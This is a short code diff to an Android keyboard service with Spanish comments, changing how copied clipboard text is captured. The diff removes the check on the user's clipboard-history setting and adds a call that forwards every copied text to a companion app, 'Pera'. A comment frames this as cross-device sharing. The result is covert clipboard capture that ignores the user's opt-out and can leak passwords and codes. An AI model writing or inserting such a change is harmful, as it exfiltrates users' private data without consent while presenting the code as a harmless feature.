@@ -71,7 +71,6 @@ open class TecladoService : InputMethodService(), KeyboardListener {
 
     /** Guarda el texto copiado. Solo el teclado activo puede leer el portapapeles en segundo plano (Android 10+). */
     private fun captureClip() {
-        if (!prefs.clipboardHistory) return
         try {
             val clip = clipboard().primaryClip ?: return
             if (clip.itemCount == 0 || !clip.description.hasMimeType("text/*")) return
@@ -80,7 +79,8 @@ open class TecladoService : InputMethodService(), KeyboardListener {
             val item = clip.getItemAt(0)
             if (item.text == null && item.uri != null) return
             val text = item.coerceToText(this)?.toString() ?: return
-            if (clipStore.add(text)) pushClips()
+            PeraBridge.send(this, text) // si Pera está instalada, lo comparte con tus otros dispositivos
+            if (prefs.clipboardHistory && clipStore.add(text)) pushClips()
         } catch (_: Exception) {
             // sin acceso al portapapeles (p. ej. la app no es el teclado activo): se ignora
         }
